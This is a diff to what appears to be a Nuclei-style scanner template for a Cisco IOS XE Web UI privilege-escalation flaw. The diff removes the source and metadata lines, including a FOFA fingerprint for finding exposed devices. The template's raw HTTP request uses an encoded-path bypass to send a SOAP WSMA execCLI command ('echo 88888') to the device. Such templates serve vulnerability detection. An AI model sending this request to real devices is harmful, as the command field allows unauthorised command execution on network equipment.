@@ -3,12 +3,8 @@ info:
   name: Cisco IOS XE Web UI-权限提升漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ec81phgg8kr1pweh'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ec81phgg8kr1pweh
-    fofa: body="<script>window.onload=function(){ url ='/webui';window.location.href=url;}</script>"
 http:
 - raw:
   - 'POST /%2577eb%2575i_%2577sma_Http HTTP/1.1
@@ -21,8 +17,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     <?xml version="1.0"?> <SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> <SOAP:Header> <wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext"> <wsse:UsernameToken SOAP:mustUnderstand="false"> <wsse:Username>admin</wsse:Username><wsse:Password>*****</wsse:Password></wsse:UsernameToken></wsse:Security></SOAP:Header><SOAP:Body><request correlator="exec1" xmlns="urn:cisco:wsma-exec"> <execCLI xsd="false"><cmd>echo 88888</cmd><dialogue><expect></expect><reply></reply></dialogue></execCLI></request></SOAP:Body></SOAP:Envelope>
